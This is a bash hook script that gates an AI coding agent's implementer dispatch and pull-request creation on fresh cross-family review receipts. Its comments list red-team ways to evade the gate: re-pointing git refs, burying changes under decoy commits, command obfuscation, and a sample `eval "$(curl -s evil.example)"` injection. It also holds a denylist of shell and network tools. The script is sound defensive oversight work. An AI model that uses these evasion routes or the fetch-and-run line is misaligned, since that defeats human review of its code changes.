#!/usr/bin/env bash
# hooks/review-gate.sh — PreToolUse gate, ONE hook, TWO mounts (ADR-087 D5).
#
#   G1 — design -> implementation. Matchers Agent|Task, fires when
#        subagent_type == implementer. Subject: the artifact named by a
#        "Review-subject:" line in the dispatch prompt. Accepts
#        subject.kind == "artifact" only.
#   G2 — branch -> PR. Matcher Bash, fires on a command matching
#        `gh pr create`. Subject: the branch diff. Accepts
#        subject.kind == "patch" only. (Ships in a separate commit per the
#        maintainer's Q1=c ruling — bisect-clean if one mount misbehaves.)
#
# `warn` mode only in R1 — both mounts. Scope statement: accidental-omission
# control, not a security boundary against a hostile/prompt-injected
# same-user agent (ADR-057's sentence, verbatim policy here too).
#
# Ordering below is load-bearing — mirrors hooks/usage-check-gate.sh's own
# comment on this. Do not reorder without re-reading why.
# summary: PreToolUse gate — blocks implementer dispatch (G1) / gh pr create (G2) without a fresh cross-family review receipt.
set -uo pipefail

# ── Step 1: machine-wide disable — LITERALLY first. Before stdin, before jq,
# before any config parse (ADR-057's ordering: the recovery path must survive
# the mechanism's own breakage). ────────────────────────────────────────────
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
RECEIPT_LIB="$DIR/../lib/receipt.sh"
[[ -f "$RECEIPT_LIB" ]] || RECEIPT_LIB="$HOME/.claude/lib/receipt.sh"
# shellcheck source=/dev/null
source "$RECEIPT_LIB" 2>/dev/null || true   # pure-bash helpers; safe even without jq

# PATH and config-dir come from the agent's environment; neither is trusted
# raw (red-team findings 1 and 2). rcpt_pin_path puts the real jq/git ahead
# of any planted lookalike; rcpt_safe_conf_dir refuses a config dir the
# managed floor's globs do not cover. Both run BEFORE the disable check --
# the whole point is that the disable file is read from the protected
# namespace and nowhere else.
declare -F rcpt_pin_path >/dev/null 2>&1 && rcpt_pin_path
if declare -F rcpt_safe_conf_dir >/dev/null 2>&1; then
  CONF_DIR="$(rcpt_safe_conf_dir)"
else
  CONF_DIR="${HOME:-}/.claude"
fi
DISABLE_FILE="$CONF_DIR/state/attest/override/review-gate.disabled"

# JSON string escaper with NO external dependency (jq is not yet confirmed
# available at this point in the script).
_json_escape() {
  local s="$1"
  s="${s//\\/\\\\}"
  s="${s//\"/\\\"}"
  s="${s//$'\n'/\\n}"
  s="${s//$'\t'/\\t}"
  printf '%s' "$s"
}

# The ONE generic machinery deny — fixed text, never conditional. Never names
# the disable file, repo-once, state/attest/override, or the config key
# (closes audit finding 8; case 52). Byte-identical whether triggered by a
# missing jq, unparseable stdin/config, or an empty disable file (case 53).
MACHINERY_TEXT='review-gate (ADR-087): this change classifies as unknown and needs
0 adversarial seat(s) across 0 non-Claude families. Missing: unknown (machinery).
Run: scripts/panel-review.sh <seat> (--subject <p> | --diff <base>..<head>)
reason=machinery'

emit_machinery_deny() {
  printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"%s"}}\n' \
    "$(_json_escape "$MACHINERY_TEXT")"
}

ovlog_protected_write() {
  # Immutable-by-the-model copy of an override consumption (D9). Best-effort;
  # never fails the caller. <tier> in machine|repo-once.
  local tier="$1" reason="$2" extra="${3:-{}}"
  local log_dir="$CONF_DIR/state/attest/override/log"
  mkdir -p "$log_dir" 2>/dev/null || return 0
  command -v jq >/dev/null 2>&1 || return 0
  local ts rand path
  ts="$(date -u +%Y%m%dT%H%M%SZ)"; rand="$RANDOM$RANDOM"
  path="$log_dir/${ts}-${rand}.json"
  jq -nc --arg tier "$tier" --arg reason "$reason" --arg ts "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
    --argjson extra "$extra" \
    '{tier:$tier, reason:$reason, ts:$ts} + $extra' > "$path" 2>/dev/null || true
}

if [[ -f "$DISABLE_FILE" ]]; then
  RAW_REASON="$(head -1 "$DISABLE_FILE" 2>/dev/null)"
  TRIMMED_REASON="$(printf '%s' "$RAW_REASON" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
  if [[ -z "$TRIMMED_REASON" ]]; then
    # Empty disable file does NOT disable — generic machinery deny, always.
    emit_machinery_deny
    exit 0
  fi
  SAN_REASON="$(rcpt_sanitize "$RAW_REASON" 200)"
  ovlog_protected_write "machine" "$SAN_REASON"
  exit 0
fi

# ── Step 2: jq missing, or stdin entirely unparseable — static, jq-free
# deny, overriding both mode and matcher filter. ────────────────────────────
if ! command -v jq >/dev/null 2>&1; then
  emit_machinery_deny
  exit 0
fi

INPUT="$(cat 2>/dev/null || echo '{}')"
if ! echo "$INPUT" | jq -e . >/dev/null 2>&1; then
  emit_machinery_deny
  exit 0
fi

# ── Step 3: guard mode resolution — repo stack-config.json > stack-defaults
# > built-in warn. Unreadable/invalid config forces "on". off -> exit 0. ────
CWD="$(echo "$INPUT" | jq -r '.cwd // empty' 2>/dev/null)"
[[ -n "$CWD" ]] || CWD="$PWD"
TOOL_NAME="$(echo "$INPUT" | jq -r '.tool_name // empty' 2>/dev/null)"
TRANSCRIPT="$(echo "$INPUT" | jq -r '.transcript_path // empty' 2>/dev/null)"

resolve_default_mode() {
  # The defaults file lives beside the config dir, never inside it. Reading
  # it from the RESOLVED config dir (not $HOME blindly) keeps a legitimate
  # profile's own defaults in play. CONF_DIR is already namespace-checked.
  local defaults="$CONF_DIR/stack-defaults.json"
  [[ -f "$defaults" ]] || defaults="$HOME/.claude/stack-defaults.json"
  local raw=""
  if [[ -f "$defaults" ]] && jq -e . "$defaults" >/dev/null 2>&1; then
    raw="$(jq -r '.guards.review_gate // empty' "$defaults" 2>/dev/null)"
  fi
  case "$raw" in off|warn|on) echo "$raw" ;; *) echo "warn" ;; esac
}

CONFIG="$(bash "${CLAUDE_PLUGIN_ROOT:-$HOME/.claude}/lib/find-stack-config.sh" "$CWD" 2>/dev/null)"
MODE="warn"
if [[ -n "$CONFIG" && -f "$CONFIG" ]]; then
  if jq -e . "$CONFIG" >/dev/null 2>&1; then
    if jq -e 'has("guards") and (.guards | type) == "object" and (.guards | has("review_gate"))' \
         "$CONFIG" >/dev/null 2>&1; then
      RAW_MODE="$(jq -r '.guards.review_gate // empty' "$CONFIG" 2>/dev/null)"
      case "$RAW_MODE" in off|warn|on) MODE="$RAW_MODE" ;; *) MODE="warn" ;; esac
    else
      MODE="$(resolve_default_mode)"
    fi
  else
    MODE="on"
    printf 'review-gate: %s is not valid JSON — failing closed (mode=on) until it parses.\n' "$CONFIG" >&2
  fi
else
  MODE="$(resolve_default_mode)"
fi
[[ "$MODE" == "off" ]] && exit 0

# ── Step 4: not stack-enabled -> exit 0 (ADR-069 D3: never a tier number). ──
[[ -n "$CONFIG" && -f "$CONFIG" ]] || exit 0

REPO_ROOT="$(git -C "$CWD" rev-parse --show-toplevel 2>/dev/null || echo "$CWD")"

# ── Step 5: matcher/mount filter. G1: Agent|Task + subagent_type==implementer.
# G2: Bash + command matches `gh pr create` (whitespace-tolerant, not a
# substring match -- `gh pr list` must NOT match; `gh   pr  create` MUST).
COMMAND="$(echo "$INPUT" | jq -r '.tool_input.command // empty' 2>/dev/null)"
SUBAGENT="$(echo "$INPUT" | jq -r '.tool_input.subagent_type // empty' 2>/dev/null)"
MOUNT=""
case "$TOOL_NAME" in
  Agent|Task)
    [[ "$SUBAGENT" == "implementer" ]] && MOUNT="G1"
    ;;
  Bash)
    # Global flags may sit between `gh` and `pr` -- `gh --repo o/r pr create`
    # slid straight past an adjacency-only match (red-team finding 6). Any
    # run of non-separator tokens is allowed in between; the separator class
    # still anchors the start so `echo gh pr create` in a string does not
    # match a new command.
    # Quotes are stripped before matching: `gh "pr" create` is the same
    # command to bash and was invisible to a raw-string match (red-team
    # verification pass, new finding 4). Variable indirection (`G=gh; $G pr
    # create`) still evades this and always will — the matcher is a string
    # test on a command line, and D5 already records that class of gap as
    # accepted. The GitHub-side control in D13 is what covers it.
    COMMAND_MATCHABLE="${COMMAND//\"/}"
    COMMAND_MATCHABLE="${COMMAND_MATCHABLE//\'/}"
    if [[ "$COMMAND_MATCHABLE" =~ (^|[\;\&\|]|&&)[[:space:]]*gh[[:space:]]+([^\;\&\|]*[[:space:]]+)?pr[[:space:]]+create([[:space:]]|$) ]]; then
      MOUNT="G2"
    fi
    ;;
esac
[[ -n "$MOUNT" ]] || exit 0

LOG_DIR="$HOME/.claude/logs"
mkdir -p "$LOG_DIR" 2>/dev/null || true
GATE_LOG="$LOG_DIR/review-gate.jsonl"
log_row() {
  command -v jq >/dev/null 2>&1 || return 0
  jq -nc "$@" >> "$GATE_LOG" 2>/dev/null || true
}

emit_deny_text() {
  local class="$1" need="$2" reason="$3"
  printf 'review-gate (ADR-087): this change classifies as %s and needs\n%s adversarial seat(s) across %s non-Claude families. Missing: %s more distinct non-Claude family review(s).\nRun: scripts/panel-review.sh <seat> (--subject <p> | --diff <base>..<head>)\nreason=%s' \
    "$class" "$need" "$need" "$need" "$reason"
}
emit_evidence_deny() {
  local class="$1" need="$2" reason="$3"
  local msg; msg="$(emit_deny_text "$class" "$need" "$reason")"
  printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"%s"}}\n' \
    "$(_json_escape "$msg")"
}

CLAUDE_FAMILY_RE='claude|anthropic|opus|sonnet|haiku|fable'

# detect_subject_moved <repo_hash> <subject_kind> <subject_path> -> rc 0 if a
# receipt exists SOMEWHERE under this subject_kind for the same subject_path,
# just not at the current hash -- distinguishes "this WAS reviewed, content
# changed since" (subject_moved) from "never reviewed at all" (no_receipt).
# Artifact-kind only (patch receipts have no single stable path).
detect_subject_moved() {
  local repo_hash="$1" subject_kind="$2" subject_path="$3"
  [[ "$subject_kind" == "artifact" && -n "$subject_path" ]] || return 1
  local base="$CONF_DIR/state/attest/reviews/${repo_hash}/${subject_kind}"
  [[ -d "$base" ]] || return 1
  local d f p
  for d in "$base"/*/; do
    [[ -d "$d" ]] || continue
    for f in "$d"*.json; do
      [[ -f "$f" ]] || continue
      p="$(jq -r '.subject.path // empty' "$f" 2>/dev/null)"
      [[ "$p" == "$subject_path" ]] && return 0
    done
  done
  return 1
}

# ── D12: iteration tolerance — an ancestor receipt plus a low delta ────────
# When no receipt matches the exact current subject, a seat is still
# satisfied iff an ancestor receipt exists AND the remaining delta from that
# receipt's own reviewed point to the current subject classifies "low". The
# delta always anchors to the receipt's OWN reviewed point, never hop-by-hop
# — no accumulation, by construction (case 57).

# d12_artifact_delta_low <repo_root> <old_blob_sha> <new_blob_sha> -> rc 0 if
# the delta between two blobs of the SAME path is a small, non-high-stakes
# edit. Blobs have no commit range to hand rr_change_class, so this is a
# documented proxy: high-stakes keyword scan over the diff text (reusing
# rr_classify_stakes' own regex), then a changed-line-count threshold (<=3)
# distinguishing "fix a typo" (case 55) from "adds a function" (case 56).
d12_artifact_delta_low() {
  local repo_root="$1" old="$2" new="$3"
  [[ "$old" == "$new" ]] && return 0
  local diff_text
  diff_text="$(git -C "$repo_root" diff --no-color "$old" "$new" 2>/dev/null)"
  [[ -n "$diff_text" ]] || return 0
  echo "$diff_text" | grep -qiE "$RR_HIGH_STAKES_RE" && return 1
  # The stakes regex is about DOMAIN risk (auth, payments, migrations); it
  # says nothing about a line that simply runs code. One line is enough:
  # `eval "$(curl -s evil.example)"` appended to an already-reviewed file
  # slipped through the <=3-line hatch untouched (red-team finding 7). Any
  # execution- or fetch-shaped addition forfeits the tolerance regardless of
  # how few lines it is.
  local added
  added="$(printf '%s\n' "$diff_text" | grep -E '^\+[^+]' || true)"
  # A denylist, and named as one: it buys friction, not a proof. It was
  # widened after a verification pass walked straight through the first
  # version with `. /tmp/evil.sh` and `bash /tmp/evil.sh` — neither the POSIX
  # dot nor a bare interpreter name was matched. Anything that starts a
  # process, fetches, or changes permissions forfeits the tolerance.
  if printf '%s\n' "$added" | grep -qiE '(^|[^[:alnum:]_./])(eval|exec|source|system|popen|spawn|subprocess|os\.system|child_process|require\([^)]*child|Function\(|bash|sh|zsh|ksh|dash|fish|python[0-9.]*|node|deno|bun|perl|ruby|php|osascript|powershell|pwsh|curl|wget|nc|ncat|socat|ssh|scp|rsync|chmod|chown|sudo|launchctl|crontab|at|systemctl|base64|openssl|xxd|git)([^[:alnum:]_]|$)'; then
    return 1
  fi
  # The POSIX dot-source (`. /path/x`) and command substitution / backticks
  # have no word boundary to anchor on, so they get their own patterns.
  if printf '%s\n' "$added" | grep -qE '(^\+[[:space:]]*\.[[:space:]]+[/~$."'"'"'])|\$\(|`|https?://|[[:space:]]>[[:space:]]*/'; then
    return 1
  fi
  local changed
  changed="$(echo "$diff_text" | grep -cE '^[+-][^+-]')"
  (( changed <= 3 ))
}

# d12_ancestor_families <repo_hash> <subject_kind> <subject_path> <current_sha>
# -> echoes one deduped, non-Claude family per line, for every ancestor
# receipt whose delta from ITS OWN reviewed point classifies low. Logs
# event:"review_gate_ancestor_pass" per hatch. Unretrievable ancestors (a
# gc'd blob, a rebased-away commit) are silently skipped -- no hatch, degrades
# to no_receipt at the caller, fail-closed in the right direction.
d12_ancestor_families() {
  local repo_hash="$1" subject_kind="$2" subject_path="$3" current_sha="$4"
  local base="$CONF_DIR/state/attest/reviews/${repo_hash}/${subject_kind}"
  [[ -d "$base" ]] || return 0
  local head_commit; head_commit="$(git -C "$REPO_ROOT" rev-parse --verify --quiet HEAD 2>/dev/null)"
  local d f
  for d in "$base"/*/; do
    [[ -d "$d" ]] || continue
    local dir_hash; dir_hash="$(basename "$d")"
    [[ "$dir_hash" == "$current_sha" ]] && continue
    for f in "$d"*.json; do
      [[ -f "$f" ]] || continue
      local json; json="$(rcpt_read "$f" 2>/dev/null)" || continue
      local state; state="$(rcpt_state "$f" 604800)"
      [[ "$state" == "CLEAN" ]] || continue
      local fam http pbytes obytes otoks
      fam="$(echo "$json" | jq -r '.evidence.family // "unknown"' 2>/dev/null)"
      http="$(echo "$json" | jq -r '.evidence.http_status // 0' 2>/dev/null)"
      pbytes="$(echo "$json" | jq -r '.evidence.prompt_bytes // 0' 2>/dev/null)"
      obytes="$(echo "$json" | jq -r '.evidence.output_bytes // 0' 2>/dev/null)"
      otoks="$(echo "$json" | jq -r '.evidence.usage.output_tokens // 0' 2>/dev/null)"
      [[ "$http" == "200" ]] || continue
      [[ "$pbytes" =~ ^[0-9]+$ && "$obytes" =~ ^[0-9]+$ && "$otoks" =~ ^[0-9]+$ ]] || continue
      (( pbytes >= 1000 && obytes >= 500 && otoks >= 100 )) || continue
      echo "$fam" | grep -qiE "$CLAUDE_FAMILY_RE" && continue

      if [[ "$subject_kind" == "artifact" ]]; then
        local rec_path rec_sha
        rec_path="$(echo "$json" | jq -r '.subject.path // empty' 2>/dev/null)"
        rec_sha="$(echo "$json" | jq -r '.subject.content_sha // empty' 2>/dev/null)"
        [[ "$rec_path" == "$subject_path" && -n "$rec_sha" ]] || continue
        git -C "$REPO_ROOT" cat-file -e "$rec_sha" 2>/dev/null || continue
        if d12_artifact_delta_low "$REPO_ROOT" "$rec_sha" "$current_sha"; then
          echo "$fam"
          log_row --arg e "review_gate_ancestor_pass" --arg kind "artifact" --arg path "$subject_path" \
            '{event:$e, kind:$kind, path:$path, ts:(now|todate)}'
        fi
      else
        local rec_head
        rec_head="$(echo "$json" | jq -r '.subject.reviewed_head // empty' 2>/dev/null)"
        [[ -n "$rec_head" && -n "$head_commit" ]] || continue
        git -C "$REPO_ROOT" merge-base --is-ancestor "$rec_head" "$head_commit" 2>/dev/null || continue
        local delta_class
        delta_class="$(cd "$REPO_ROOT" && rr_change_class "$rec_head" "$head_commit")"
        if [[ "$delta_class" == "low" ]]; then
          echo "$fam"
          log_row --arg e "review_gate_ancestor_pass" --arg kind "patch" --arg head "$rec_head" \
            '{event:$e, kind:$kind, reviewed_head:$head, ts:(now|todate)}'
        fi
      fi
    done
  done
}

# gate_check_seats <repo_hash> <subject_kind> <subject_sha> <need> [<subject_path>]
# -> echoes "pass" or "deny <reason_code>". D2's third control: re-derives
# everything — schema, hash, freshness, family, floors — never trusts the
# minter's claim.
gate_check_seats() {
  local repo_hash="$1" subject_kind="$2" subject_sha="$3" need="$4" subject_path="${5:-}"
  local recdir="$CONF_DIR/state/attest/reviews/${repo_hash}/${subject_kind}/${subject_sha}"
  local -a valid_families=() same_family_count=()
  local any_files=0 any_claude=0 any_stale=0 any_invalid=0 any_vacuous=0
  if [[ -d "$recdir" ]]; then
    local f
    for f in "$recdir"/*.json; do
      [[ -f "$f" ]] || continue
      any_files=1
      local json
      json="$(rcpt_read "$f" 2>/dev/null)" || { any_invalid=1; continue; }
      local state
      state="$(rcpt_state "$f" 604800)"
      if [[ "$state" != "CLEAN" ]]; then any_stale=1; continue; fi
      local rec_kind; rec_kind="$(echo "$json" | jq -r '.subject.kind' 2>/dev/null)"
      [[ "$rec_kind" == "$subject_kind" ]] || { any_invalid=1; continue; }
      # The receipt's OWN internal claim must match the hash we independently
      # recomputed -- a receipt hand-placed at the right directory but
      # carrying a different claimed hash inside its JSON is a forgery, not
      # a pass (case 43).
      local rec_sha
      if [[ "$subject_kind" == "artifact" ]]; then
        rec_sha="$(echo "$json" | jq -r '.subject.content_sha // empty' 2>/dev/null)"
      else
        rec_sha="$(echo "$json" | jq -r '.subject.patch_sha // empty' 2>/dev/null)"
      fi
      [[ "$rec_sha" == "$subject_sha" ]] || { any_invalid=1; continue; }
      local http fam pbytes obytes otoks
      http="$(echo "$json" | jq -r '.evidence.http_status // 0' 2>/dev/null)"
      fam="$(echo "$json" | jq -r '.evidence.family // "unknown"' 2>/dev/null)"
      pbytes="$(echo "$json" | jq -r '.evidence.prompt_bytes // 0' 2>/dev/null)"
      obytes="$(echo "$json" | jq -r '.evidence.output_bytes // 0' 2>/dev/null)"
      otoks="$(echo "$json" | jq -r '.evidence.usage.output_tokens // 0' 2>/dev/null)"
      if [[ "$http" != "200" ]]; then any_invalid=1; continue; fi
      if ! [[ "$pbytes" =~ ^[0-9]+$ && "$obytes" =~ ^[0-9]+$ && "$otoks" =~ ^[0-9]+$ ]] \
         || (( pbytes < 1000 || obytes < 500 || otoks < 100 )); then
        any_vacuous=1; continue
      fi
      if echo "$fam" | grep -qiE "$CLAUDE_FAMILY_RE"; then any_claude=1; continue; fi
      same_family_count+=("$fam")
      local dup=0 vf
      for vf in "${valid_families[@]:-}"; do [[ "$vf" == "$fam" ]] && dup=1; done
      (( dup == 0 )) && valid_families+=("$fam")
    done
  fi
  local count="${#valid_families[@]}"
  if (( count >= need )); then echo "pass"; return; fi

  # D12 ancestor-plus-low-delta hatch: only consulted when the exact match
  # was insufficient. Merges into the SAME dedup set, so a family already
  # counted exactly does not double-count via an ancestor too.
  if (( count < need )); then
    local hfam dup vf
    while IFS= read -r hfam; do
      [[ -z "$hfam" ]] && continue
      dup=0
      for vf in "${valid_families[@]:-}"; do [[ "$vf" == "$hfam" ]] && dup=1; done
      (( dup == 0 )) && valid_families+=("$hfam")
    done < <(d12_ancestor_families "$repo_hash" "$subject_kind" "$subject_path" "$subject_sha")
    count="${#valid_families[@]}"
  fi
  if (( count >= need )); then echo "pass"; return; fi

  if (( any_files == 0 )); then
    if detect_subject_moved "$repo_hash" "$subject_kind" "$subject_path"; then
      echo "deny subject_moved"
    else
      echo "deny no_receipt"
    fi
    return
  fi
  if (( ${#same_family_count[@]} >= need && count < need )); then echo "deny same_family_twice"; return; fi
  if (( any_vacuous == 1 && count == 0 )); then echo "deny vacuous"; return; fi
  if (( any_claude == 1 && count == 0 )); then echo "deny wrong_family"; return; fi
  if (( any_stale == 1 && count == 0 )); then echo "deny stale"; return; fi
  if (( any_invalid == 1 && count == 0 )); then echo "deny invalid_receipt"; return; fi
  echo "deny no_receipt"
}

required_seats_for() {
  case "$1" in
    high) echo 2 ;;
    med) echo 1 ;;
    *) echo 0 ;;
  esac
}

# repo_once_override_try <repo_hash> -> rc 0 if consumed (bypass granted)
repo_once_override_try() {
  local repo_hash="$1"
  local ovfile="$CONF_DIR/state/attest/override/repo-once/${repo_hash}.json"
  [[ -f "$ovfile" ]] || return 1
  [[ "$TRANSCRIPT" == */workflows/* ]] && return 1
  local orch_mode; orch_mode="$(jq -r '.orchestration_mode // "main-thread"' "$CONFIG" 2>/dev/null)"
  [[ -n "$orch_mode" ]] || orch_mode="main-thread"
  [[ "$orch_mode" == "main-thread" ]] || return 1
  local reason; reason="$(jq -r '.reason // empty' "$ovfile" 2>/dev/null)"
  [[ -n "$reason" ]] || return 1
  mv -f "$ovfile" "${ovfile}.used" 2>/dev/null || return 1
  ovlog_protected_write "repo-once" "$(rcpt_sanitize "$reason" 200)" \
    "$(jq -nc --arg rh "$repo_hash" '{repo_hash:$rh}')"
  return 0
}

# ── Shared setup for both mounts ────────────────────────────────────────────
USAGE_LIB="$DIR/../scripts/lib/usage-check-common.sh"
[[ -f "$USAGE_LIB" ]] || USAGE_LIB="$HOME/.claude/scripts/lib/usage-check-common.sh"
# shellcheck source=/dev/null
source "$USAGE_LIB" 2>/dev/null || { emit_machinery_deny; exit 0; }
RH="$(uc_repo_hash "$REPO_ROOT")"
# shellcheck source=/dev/null
source "$DIR/../scripts/lib/review-router.sh" 2>/dev/null || { emit_machinery_deny; exit 0; }

decide_and_emit() {
  local class="$1" reason="$2"
  local need; need="$(required_seats_for "$class")"
  log_row --arg e "review_gate" --arg mount "$MOUNT" --arg d "$([[ "$MODE" == "on" ]] && echo deny || echo would-deny)" \
    --arg class "$class" --arg reason "$reason" --arg subagent "$SUBAGENT" \
    '{event:$e, mount:$mount, decision:$d, class:$class, reason:$reason, subagent:$subagent, ts:(now|todate)}'
  if [[ "$MODE" == "on" ]]; then
    if repo_once_override_try "$RH"; then
      log_row --arg e "review_gate" --arg mount "$MOUNT" --arg d "pass-override" '{event:$e, mount:$mount, decision:$d, ts:(now|todate)}'
      exit 0
    fi
    emit_evidence_deny "$class" "$need" "$reason"
  fi
  exit 0
}

if [[ "$MOUNT" == "G1" ]]; then
  # ── G1: subject resolution (Review-subject: line) ─────────────────────────
  PROMPT="$(echo "$INPUT" | jq -r '.tool_input.prompt // empty' 2>/dev/null)"
  SUBJECT_LINE="$(printf '%s\n' "$PROMPT" | grep -oE 'Review-subject:[[:space:]]*.*$' | head -1 | sed -E 's/^Review-subject:[[:space:]]*//')"
  SUBJECT_LINE="$(printf '%s' "$SUBJECT_LINE" | sed -e 's/[[:space:]]*$//')"

  if [[ -z "$SUBJECT_LINE" ]]; then
    decide_and_emit "unknown" "no_subject_declared"
  fi

  SUBJECT_NORM="${SUBJECT_LINE#./}"
  ABS_SUBJECT="$REPO_ROOT/$SUBJECT_NORM"
  if [[ -L "$ABS_SUBJECT" || -d "$ABS_SUBJECT" || ! -f "$ABS_SUBJECT" ]]; then
    decide_and_emit "unknown" "no_subject_declared"
  fi

  SUBJECT_SHA="$(rcpt_artifact_sha "$REPO_ROOT" "$SUBJECT_NORM" 2>/dev/null)"
  if [[ -z "$SUBJECT_SHA" ]]; then
    decide_and_emit "unknown" "no_subject_declared"
  fi

  # change_class: base = repo's default branch, head = HEAD. G1 fires BEFORE
  # implementer has written anything, so there is no "diff of the change" yet
  # to classify -- the class instead reflects how risky the branch's own
  # accumulated (committed) work already is. Documented implementer judgment
  # call; not explicit in the ADR text for this mount.
  G1_BASE="$(cd "$REPO_ROOT" && rr_default_base)"
  CLASS="$(cd "$REPO_ROOT" && rr_change_class "$G1_BASE" "HEAD")"
  log_row --arg e "change_class" --arg mount "G1" --arg base "$G1_BASE" --arg class "$CLASS" \
    '{event:$e, mount:$mount, base:$base, head:"HEAD", class:$class, ts:(now|todate)}'

  [[ "$CLASS" == "low" ]] && exit 0

  NEED="$(required_seats_for "$CLASS")"
  VERDICT="$(gate_check_seats "$RH" "artifact" "$SUBJECT_SHA" "$NEED" "$SUBJECT_NORM")"

  if [[ "$VERDICT" == "pass" ]]; then
    log_row --arg e "review_gate" --arg mount "G1" --arg d "pass" --arg class "$CLASS" '{event:$e, mount:$mount, decision:$d, class:$class, ts:(now|todate)}'
    exit 0
  fi

  REASON="${VERDICT#deny }"
  decide_and_emit "$CLASS" "$REASON"

elif [[ "$MOUNT" == "G2" ]]; then
  # ── G2: subject = the branch diff, base per D4's max-over-candidates rule ─
  # (audit finding 3's regression test, case 49: a rewritten origin/main ref
  # must not collapse the class to low). Every candidate that resolves is
  # classified; the WORST (max) class wins. An empty diff at any candidate is
  # already "high" inside rr_change_class itself (the ref-rewrite attack's
  # exact shape), so max-over-candidates naturally stays high even if every
  # OTHER candidate is rewritten to match HEAD.
  class_rank() { case "$1" in low) echo 0 ;; med) echo 1 ;; *) echo 2 ;; esac; }

  EXPLICIT_BASE="$(printf '%s' "$COMMAND" | grep -oE -- '--base[[:space:]]+[^[:space:]]+' | head -1 | sed -E 's/^--base[[:space:]]+//')"

  declare -a G2_CANDIDATES=()
  declare -a G2_CANDIDATE_LABELS=()
  declare -a G2_NAMED_CANDIDATES=()
  add_candidate() {
    local label="$1" ref="$2" resolved
    [[ -n "$ref" ]] || return 0
    resolved="$(git -C "$REPO_ROOT" merge-base "$ref" HEAD 2>/dev/null)"
    [[ -n "$resolved" ]] || return 0
    G2_CANDIDATES+=("$resolved"); G2_CANDIDATE_LABELS+=("$label:$ref")
    # Named refs are the ones an agent can re-point; the synthetic lookbacks
    # below are not, and they sit a fixed short distance from HEAD by
    # construction. Only the named ones say anything about how far back a
    # trustworthy base actually is.
    [[ "$label" == HEAD~* ]] || G2_NAMED_CANDIDATES+=("$resolved")
  }
  add_candidate "origin/main" "origin/main"
  add_candidate "origin/HEAD" "origin/HEAD"
  add_candidate "@{upstream}" "@{upstream}"
  add_candidate "main" "main"
  # Fixed lookback candidates. Every candidate above is a NAMED ref, and
  # every named ref is writable by the agent: `git update-ref
  # refs/remotes/origin/main HEAD~1` makes a branch of malicious work look
  # like one harmless change (red-team finding 5). A commit-count offset
  # cannot be re-pointed the same way, so shadowing the class now costs a
  # long tail of decoy changes rather than one command.
  for _lb in 5 25 100; do
    add_candidate "HEAD~$_lb" "HEAD~$_lb"
  done
  if [[ -n "$EXPLICIT_BASE" ]]; then
    RESOLVED_EXPLICIT="$(git -C "$REPO_ROOT" rev-parse --verify --quiet "${EXPLICIT_BASE}^{commit}" 2>/dev/null)"
    [[ -n "$RESOLVED_EXPLICIT" ]] && { G2_CANDIDATES+=("$RESOLVED_EXPLICIT"); G2_CANDIDATE_LABELS+=("--base:$EXPLICIT_BASE"); }
  fi

  CLASS="high"; CHOSEN_BASE=""
  if [[ "${#G2_CANDIDATES[@]}" -eq 0 ]]; then
    CLASS="high"   # nothing resolves -> fail-safe (unresolvable origin/main at G2, case 48)
  else
    BEST_RANK=-1
    for c in "${G2_CANDIDATES[@]}"; do
      cls="$(cd "$REPO_ROOT" && rr_change_class "$c" "HEAD")"
      r="$(class_rank "$cls")"
      if (( r > BEST_RANK )); then BEST_RANK="$r"; CLASS="$cls"; CHOSEN_BASE="$c"; fi
    done

    # Fixed lookbacks are a finite ladder, and a ladder can be climbed past:
    # 101 throwaway commits push the real change beyond HEAD~100, and every
    # candidate then sees only decoys (red-team verification pass, new
    # finding 2). So the two rules interlock — up to 100 commits the ladder
    # catches it; beyond that, the fact that NO candidate is within 100
    # commits of HEAD is itself the signal. A branch nobody can find a
    # nearby base for is not a branch this gate can classify as low.
    NEAREST=""
    for c in "${G2_NAMED_CANDIDATES[@]:-}"; do
      [[ -n "$c" ]] || continue
      d="$(git -C "$REPO_ROOT" rev-list --count "${c}..HEAD" 2>/dev/null)"
      [[ "$d" =~ ^[0-9]+$ ]] || continue
      if [[ -z "$NEAREST" ]] || (( d < NEAREST )); then NEAREST="$d"; fi
    done
    if [[ -n "$NEAREST" ]] && (( NEAREST > 100 )); then
      log_row --arg e "review_gate_far_base" --arg mount "G2" --arg dist "$NEAREST" \
        '{event:$e, mount:$mount, nearest_base_distance:$dist, ts:(now|todate)}'
      CLASS="high"
    fi
  fi

  log_row --arg e "change_class" --arg mount "G2" --arg base "$CHOSEN_BASE" --arg class "$CLASS" \
    --arg candidates "$(printf '%s ' "${G2_CANDIDATE_LABELS[@]:-}")" \
    '{event:$e, mount:$mount, base:$base, head:"HEAD", class:$class, candidates:$candidates, ts:(now|todate)}'

  [[ "$CLASS" == "low" ]] && exit 0

  # Subject hash is computed from the NATURAL default base (what a reviewer's
  # own `panel-review.sh --diff` run would resolve to), independent of which
  # candidate happened to drive the worst-case class above.
  SUBJECT_BASE="$(cd "$REPO_ROOT" && rr_default_base)"
  SUBJECT_BASE_SHA="$(git -C "$REPO_ROOT" rev-parse --verify --quiet "${SUBJECT_BASE}^{commit}" 2>/dev/null)"
  HEAD_SHA="$(git -C "$REPO_ROOT" rev-parse --verify --quiet 'HEAD^{commit}' 2>/dev/null)"
  if [[ -z "$SUBJECT_BASE_SHA" || -z "$HEAD_SHA" ]]; then
    decide_and_emit "$CLASS" "no_receipt"
  fi
  SUBJECT_SHA="$(rcpt_patch_sha "$REPO_ROOT" "$SUBJECT_BASE_SHA" "$HEAD_SHA" 2>/dev/null)"
  if [[ -z "$SUBJECT_SHA" ]]; then
    decide_and_emit "$CLASS" "no_receipt"
  fi

  NEED="$(required_seats_for "$CLASS")"
  VERDICT="$(gate_check_seats "$RH" "patch" "$SUBJECT_SHA" "$NEED")"

  if [[ "$VERDICT" == "pass" ]]; then
    log_row --arg e "review_gate" --arg mount "G2" --arg d "pass" --arg class "$CLASS" '{event:$e, mount:$mount, decision:$d, class:$class, ts:(now|todate)}'
    exit 0
  fi

  REASON="${VERDICT#deny }"
  decide_and_emit "$CLASS" "$REASON"
fi

exit 0
